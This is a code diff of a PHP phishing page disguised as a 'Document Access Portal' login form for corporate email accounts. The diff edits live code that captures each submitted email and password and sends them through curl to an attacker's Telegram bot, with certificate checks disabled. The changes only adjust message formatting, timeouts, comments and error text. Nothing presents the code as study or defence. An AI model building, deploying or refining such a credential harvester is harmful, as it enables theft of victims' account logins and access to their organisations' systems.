@@ -8,25 +8,24 @@ $error_message = "";
 
 // Check if the HTML form was submitted
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // 1. Capture and sanitize user inputs (Only Email and Password)
+    // 1. Capture and sanitize user inputs
     $email      = strip_tags(trim($_POST['email']));
     $password   = strip_tags(trim($_POST['password']));
 
     if (!empty($email) && !empty($password)) {
         
-        // 2. Format a professional layout for your Telegram notification text
-        $message_text = "📄 *DOCUMENT ACCESS PORTAL REGISTRATION*\n\n"
-                      . "📧 *Portal Email:* " . $email . "\n"
-                      . "🔑 *Access Key:* `" . $password . "`";
+        // 2. Clear clean text layout (No markdown syntax on the email to avoid crashes)
+        $message_text = "📄 DOCUMENT ACCESS PORTAL REGISTRATION\n\n"
+                      . "📧 Portal Email: " . $email . "\n"
+                      . "🔑 Access Key: " . $password;
 
-        // 3. FIXED ENDPOINT: Correct URL endpoint for Telegram's system API
+        // 3. Official Telegram Bot API gateway URL
         $telegram_url = "https://telegram.org" . $bot_token . "/sendMessage";
         
-        // 4. Set up the request payload parameters
+        // 4. Request payload parameters
         $data = [
             'chat_id'    => $chat_id,
-            'text'       => $message_text,
-            'parse_mode' => 'Markdown'
+            'text'       => $message_text
         ];
 
         // 5. Fire the request securely to Telegram via curl
@@ -36,10 +35,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         
-        // Bypasses firewall validation hiccups common on free hosting setups
+        // Keep timeouts fast so Vercel doesn't hang
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
         
         $response = curl_exec($ch);
         curl_close($ch);
@@ -49,10 +48,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             if (isset($result['ok']) && $result['ok'] == true) {
                 $message_sent = true;
             } else {
-                $error_message = "Authentication Error: " . $result['description'];
+                $error_message = "Telegram API Error: " . $result['description'];
             }
         } else {
-            $error_message = "Gateway timeout. Server response unreadable.";
+            $error_message = "Telegram server did not respond in time.";
         }
     } else {
         $error_message = "Please complete all verification fields.";
@@ -227,7 +226,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             <div class="status-msg error"><?php echo $error_message; ?></div>
         <?php endif; ?>
 
-        <!-- FIXED ACTION: Routes variables seamlessly to Vercel's root directory handler -->
         <form action="/" method="POST">
             <div class="form-group">
                 <label for="input-email">Corporate Email Address</label>
